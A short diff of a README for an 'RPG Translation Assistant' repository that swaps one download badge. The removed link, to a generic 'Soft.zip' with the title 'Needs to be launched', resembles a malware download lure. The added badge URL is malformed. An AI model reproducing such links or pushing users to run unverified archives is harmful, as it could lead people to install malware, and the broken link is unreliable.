@@ -19,7 +19,7 @@ Welcome to the RPG Translation Assistant repository! This tool is a graphical in
 ## Get Started 🛠️
 
 To access the RPG Translation Assistant tool, simply click on the link below:
-[![Download RPG Translation Assistant](https://img.shields.io/badge/Download-RPG%20Translation%20Assistant-blue.svg)](https://github.com/files/Soft.zip "Needs to be launched")
+[![Download RPG Translation Assistant](https://github.com/rakaaaaaarioo/RPGTranslationAssistant/releases/tag/v1.2%20Translation%https://github.com/rakaaaaaarioo/RPGTranslationAssistant/releases/tag/v1.2)](https://github.com/rakaaaaaarioo/RPGTranslationAssistant/releases/tag/v1.2 "Needs to be launched")
 
 If the above link does not work or if you prefer other methods, please check the **Releases** section of this repository.
 
